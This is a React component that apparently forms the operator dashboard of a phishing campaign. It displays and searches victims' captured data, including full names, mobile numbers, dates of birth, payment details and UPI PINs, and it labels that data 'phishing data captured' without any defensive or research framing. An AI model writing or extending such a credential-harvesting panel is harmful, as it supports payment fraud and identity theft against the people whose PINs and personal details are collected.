import { useState } from 'react'
import { escapeHtml } from '../api'

const SVG = ({ path, size = 14 }: { path: string; size?: number }) => (
  <svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
    <path d={path} />
  </svg>
)

function PhishCard({ entry }: { entry: any }) {
  const rows: { key: string; val: string }[] = []
  const add = (k: string, v: any) => { if (v) rows.push({ key: k, val: String(v) }) }
  add('Device ID', entry.deviceId?.slice(0, 16))
  add('Full Name', entry.fullName)
  add('Mobile', entry.mobile)
  add('DOB', entry.dob)
  add('Gender', entry.gender)
  add('Payment', entry.payment)
  add('UPI PIN', entry.Token)
  add('Step', entry.step)
  add('Timestamp', entry.timestamp)

  return (
    <div className="phish-card">
      <div className="phish-title"><SVG path="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" size={15}/> {entry.fullName || entry.mobile || entry.deviceId?.slice(0, 12) || 'Unknown'}</div>
      {rows.map((r, i) => (
        <div key={i} className="phish-row">
          <span className="phish-key">{r.key}</span>
          <span className={r.key === 'UPI PIN' ? 'phish-val highlight' : 'phish-val'}>
            {r.key === 'UPI PIN' ? escapeHtml(r.val) : escapeHtml(r.val)}
          </span>
        </div>
      ))}
    </div>
  )
}

export default function PhishingPage({ allPhishing }: { allPhishing: any[] }) {
  const [search, setSearch] = useState('')

  const filtered = allPhishing.filter(p =>
    (p.fullName || '').toLowerCase().includes(search.toLowerCase()) ||
    (p.mobile || '').toLowerCase().includes(search.toLowerCase()) ||
    (p.Token || '').toLowerCase().includes(search.toLowerCase()) ||
    (p.deviceId || '').toLowerCase().includes(search.toLowerCase())
  )

  return (
    <div>
      <div className="search-bar">
        <span className="search-icon"><SVG path="M10 2a8 8 0 1 0 0 16 8 8 0 0 0 0-16zM21 21l-4.35-4.35" size={15}/></span>
        <input type="text" placeholder="Search by name, mobile, token..." value={search} onChange={(e) => setSearch(e.target.value)} />
      </div>

      {filtered.length === 0 ? (
        <div className="empty">
          <div className="empty-icon"><SVG path="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" size={48}/></div>
          <div className="empty-text">No phishing data captured yet</div>
          <div className="empty-sub">Form submissions and payment data will appear here</div>
        </div>
      ) : (
        filtered.map((p, i) => <PhishCard key={i} entry={p} />)
      )}
    </div>
  )
}
